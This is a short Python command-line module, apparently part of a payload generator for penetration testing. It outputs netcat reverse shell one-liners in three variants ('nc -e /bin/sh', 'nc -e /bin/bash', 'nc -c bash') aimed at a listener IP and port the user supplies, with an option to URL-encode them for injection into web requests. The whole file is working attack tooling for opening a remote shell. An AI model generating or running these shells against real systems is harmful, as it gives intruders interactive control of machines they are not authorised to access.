import click
from colorama import Fore
from urllib.parse import quote

@click.command()
@click.argument("listener_ip")
@click.argument("listener_port")
@click.option("-r", "--raw", is_flag=True, default=False, help="Enable raw output.")
@click.option("-u", "--urlencode", is_flag=True, default=False, help="URL-encode the output.")
@click.option("-v", "--variant", default="1", type=click.Choice(["1", "2", "3"]),
              help="1=nc -e /bin/sh, 2=nc -e /bin/bash, 3=nc -c bash")
def command(listener_ip, listener_port, raw, urlencode, variant):
    """Return Netcat traditional reverse shell (requires -e support)"""
    cmds = {
        "1": f"nc -e /bin/sh {listener_ip} {listener_port}",
        "2": f"nc -e /bin/bash {listener_ip} {listener_port}",
        "3": f"nc -c bash {listener_ip} {listener_port}",
    }
    cmd = cmds[variant]
    if urlencode:
        cmd = quote(cmd)
    if not raw:
        click.secho(f"{Fore.LIGHTGREEN_EX}Netcat traditional reverse shell:\n\t{Fore.WHITE}{cmd}")
    else:
        click.secho(cmd, nl=False)
